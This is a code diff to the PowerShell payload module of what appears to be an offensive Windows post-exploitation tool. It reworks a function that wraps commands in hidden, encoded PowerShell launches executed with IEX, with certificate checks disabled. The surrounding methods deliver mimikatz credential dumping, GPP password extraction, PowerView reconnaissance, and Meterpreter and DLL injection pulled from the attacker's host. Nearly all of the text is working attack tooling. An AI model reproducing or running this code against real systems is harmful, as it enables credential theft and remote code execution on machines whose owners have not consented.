@@ -2,27 +2,37 @@ from base64 import b64encode
 import logging
 import settings
 
-def ps_command(command, mimikatz=False):
+def ps_command(command, arch_sensitive=True):
     logging.info('PS command to be encoded: ' + command)
 
     if settings.args.server == 'https':
-        logging.info('Disabling certificate checking for the following PS command: ' + command)
+        logging.info('Disabling certificate checking')
         command = "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" + command
 
-    if not mimikatz:
-        # get the correct PowerShell path and set it temporarily to %pspath%
-        triggerCMD = "if %PROCESSOR_ARCHITECTURE%==x86 (set pspath='') else (set pspath=%WinDir%\\syswow64\\windowspowershell\\v1.0\\)&"
+    if arch_sensitive:
 
-        # invoke PowerShell with the appropriate options
-        # triggerCMD += "call %pspath%powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc " + encCMD
-        triggerCMD += ' call %pspath%powershell.exe -NoP -NonI -W Hidden -Enc {}'.format(b64encode(command.encode('UTF-16LE')))
-    
-    else:
-        triggerCMD = 'powershell.exe -NoP -NonI -W Hidden -Enc {}'.format(b64encode(command.encode('UTF-16LE')))
+        command = """
+        $command = '{}'
+        if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64') 
+        {{
+            
+            $exec = $Env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Enc ' + $command
+            IEX $exec
+        }}
+        else
+        {{
+            $exec = [System.Convert]::FromBase64String($command)
+            $exec = [Text.Encoding]::Unicode.GetString($exec)
+            IEX $exec
+        }}""".format(b64encode(command.strip().encode('UTF-16LE')))
 
-    logging.info('Full PS command: ' + triggerCMD)
+        logging.info('Wrapped PS command in architecture aware logic:\n' + command)
 
-    return triggerCMD
+    command = 'powershell.exe -NoP -NonI -W Hidden -Enc {}'.format(b64encode(command.encode('UTF-16LE')))
+
+    logging.info('Full PS command: ' + command)
+
+    return command
 
 class PowerShell:
 
@@ -54,7 +64,7 @@ class PowerShell:
                                           addr=self.localip,
                                           katz_command=command)
 
-        return ps_command(command, mimikatz=True)
+        return ps_command(command, arch_sensitive=False)
 
     def gpp_passwords(self):
         command = """
@@ -73,7 +83,7 @@ class PowerShell:
                                           port=settings.args.server_port,
                                           addr=self.localip)
 
-        return ps_command(command)
+        return ps_command(command, arch_sensitive=False)
 
     def powerview(self, command):
 
@@ -94,7 +104,7 @@ class PowerShell:
                                           view_command=command)
 
 
-        return ps_command(command, int(self.arch))
+        return ps_command(command, arch_sensitive=False)
 
     def inject_meterpreter(self):
         #PowerSploit's 3.0 update removed the Meterpreter injection options in Invoke-Shellcode
@@ -141,8 +151,6 @@ class PowerShell:
         if settings.args.procid:
             command += " -ProcessID {}".format(settings.args.procid)
 
-        command += ';'
-
         return ps_command(command)
 
     def inject_exe_dll(self):
@@ -161,7 +169,5 @@ class PowerShell:
 
         if settings.args.inject == 'exe' and settings.args.exeargs:
             command += " -ExeArgs \"{}\"".format(settings.args.exeargs)
-
-        command += ';'
 
         return ps_command(command)
